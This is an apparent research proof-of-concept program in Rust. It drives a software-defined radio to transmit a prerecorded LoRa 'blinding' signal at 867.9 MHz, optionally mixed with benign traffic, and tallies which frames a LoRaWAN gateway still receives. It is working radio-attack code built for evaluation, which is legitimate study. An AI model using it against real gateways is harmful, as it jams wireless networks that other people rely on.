use blindspot_demo::udp_server_frame_counter::UdpServerFrameCounter;
use clap::Parser;
use futuresdr::blocks::seify::SinkBuilder;
use futuresdr::blocks::{Combine, FileSource};
use futuresdr::macros::connect;
use futuresdr::num_complex::Complex32;
use futuresdr::runtime::Flowgraph;
use futuresdr::runtime::Result;
use futuresdr::runtime::Runtime;
use futuresdr::seify::Device;
use serde::{Deserialize, Serialize};
use std::time::Duration;

#[derive(Debug, Clone, Copy, Serialize, Deserialize)]
#[allow(non_camel_case_types)]
pub enum SpreadingFactor {
    SF5 = 0,
    SF6,
    SF7,
    SF8,
    SF9,
    SF10,
    SF11,
    SF12,
}

#[derive(Serialize, Deserialize)]
struct BenignTrafficParams {
    sent: [[usize; 8]; 8],
    duty_cycle: f32,
    spreading_factor: Option<SpreadingFactor>,
    length_in_blinding_bursts: usize,
}
pub const NUM_CHANNELS: usize = 8;
pub const NUM_SF: usize = 8;
#[derive(Parser, Debug)]
#[clap(version)]
struct Args {
    /// Optional path to benign signal file to mix with attack signal before transmitting
    #[clap(long, short = 'f')]
    benign_signal_file: Option<String>,
    /// Attenuation of benign signal vs blinding signal in dB
    #[clap(long, short = 'a', default_value_t = 0.0)]
    benign_signal_attenuation: f64,
    /// UDP port configured in the gateway
    #[clap(long, default_value_t = 1730)]
    packet_forwarder_port: u16,
    /// Filter for SDR device
    #[clap(long, default_value_t = String::from(""))]
    args: String,
    /// Transmit gain for SDR
    #[clap(long, short = 'g', default_value_t = 50.0)]
    tx_gain: f64,
    /// Enables collecting of received frame count from gateway via semtech_udp protocol and writing the result to file
    #[clap(long)]
    collect_results: bool,
}

fn main() -> Result<()> {
    let args = Args::parse();
    let mut fg = Flowgraph::new();

    let blinding_signal_source =
        FileSource::<Complex32>::new("./BlindSpot_dataset/blinding_signal_1_2_live.cf32", true);

    let combined_signal_source = if let Some(benign_signal_file) = args.benign_signal_file.clone() {
        let benign_signal_source = FileSource::<Complex32>::new(&benign_signal_file, false);
        let attenuation_factor_linear = 10.0_f64.powf(args.benign_signal_attenuation / 10.0) as f32;
        let combine =
            Combine::new(move |a: &Complex32, b: &Complex32| a + b * attenuation_factor_linear);
        connect!(fg, blinding_signal_source > combine.in0;
        benign_signal_source > combine.in1);
        combine
    } else {
        fg.add_block(blinding_signal_source)?
    };

    let device = Device::from_args(&args.args)?;
    let sink = SinkBuilder::new()
        .device(device.clone())
        .sample_rate(1800000.0)
        .frequency(867900000.0)
        .gain(args.tx_gain)
        .channel(1);
    let sink = sink.build()?;
    connect!(fg,
        combined_signal_source > sink;
    );

    let rt = Runtime::new();
    let (fg, _handle) = rt.start_sync(fg);

    let hardware_gateway_result_interface = if args.collect_results {
        let hardware_gateway_result_interface_tmp =
            UdpServerFrameCounter::new(args.packet_forwarder_port);
        println!("waiting for gateway to connect...");
        let hardware_gateway_result_interface_tmp = futuresdr::async_io::block_on(async move {
            hardware_gateway_result_interface_tmp
                .wait_until_connected()
                .await
        });
        println!("gateway connected.");
        Some(hardware_gateway_result_interface_tmp)
    } else {
        None
    };

    println!("transmitting...");
    // ==============================================================
    // Wait for Completion
    // ==============================================================
    let _ = futuresdr::async_io::block_on(async move { fg.await.unwrap() });
    println!("FINISHED.");

    if let Some(hardware_gateway_result_interface_tmp) = hardware_gateway_result_interface {
        let benign_signal_file = args.benign_signal_file.unwrap();
        let benign_signal_parameter_file = benign_signal_file.replace(".cf32", ".json");
        let benign_signal_parameters = std::fs::read_to_string(benign_signal_parameter_file)
            .expect("Unable to read parameter file");
        let benign_signal_parameters: BenignTrafficParams =
            serde_json::from_str(&benign_signal_parameters)?;
        let received: Vec<Vec<usize>> = futuresdr::async_io::block_on(async move {
            async_std::task::sleep(Duration::from_secs(1)).await;
            hardware_gateway_result_interface_tmp
                .terminate_and_accumulate_results(NUM_CHANNELS, NUM_SF)
                .await
        });
        let mut sent = benign_signal_parameters.sent;
        for sf in 5..=6 {
            for ch in 0..8 {
                sent[sf - 5][ch] = benign_signal_parameters.length_in_blinding_bursts
                    * if sf == 5 { 2 } else { 1 };
            }
        }
        let result_string = format!("HW GW:{:?}:{:?}", received, sent);
        let _ = std::fs::create_dir("./perf_data");
        std::fs::write(
            format!(
                "./perf_data/lora_eval-poc_0_{}_{}_2_-3_{}_0.0_{}_.csv",
                args.tx_gain,
                benign_signal_parameters.duty_cycle,
                args.benign_signal_attenuation,
                benign_signal_parameters
                    .spreading_factor
                    .map_or("all".to_string(), |sf| (sf as usize + 5).to_string()),
            ),
            result_string,
        )
        .expect("Unable to write result file");
    }

    Ok(())
}
